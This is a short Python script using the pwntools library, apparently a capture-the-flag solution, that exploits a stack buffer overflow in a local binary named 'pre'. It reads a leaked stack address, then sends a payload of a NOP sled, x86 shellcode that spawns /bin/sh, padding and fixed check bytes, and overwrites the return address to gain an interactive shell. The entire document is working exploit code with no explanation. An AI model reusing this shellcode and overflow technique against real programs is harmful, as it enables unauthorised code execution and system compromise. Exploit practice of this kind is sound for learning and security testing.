from pwn import *
import binascii

proc = process("./pre")
a = proc.recv(1024)
print a
a = a.split(':')[1].strip(' ')
a = int(a, 16)
print binascii.hexlify(p32(a))
payload = "\x90"*30+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x2c\x83\xE8\x21\xcd\x80"+"a"*(0x7c-56)+"\x00\x00\x00\x00\xa5\x31\x5a\x47\x55\x15\x50\x40"+"a"*(0x20-20)
proc.sendline(payload+p32(a))
print proc.recv(1024)
proc.interactive()
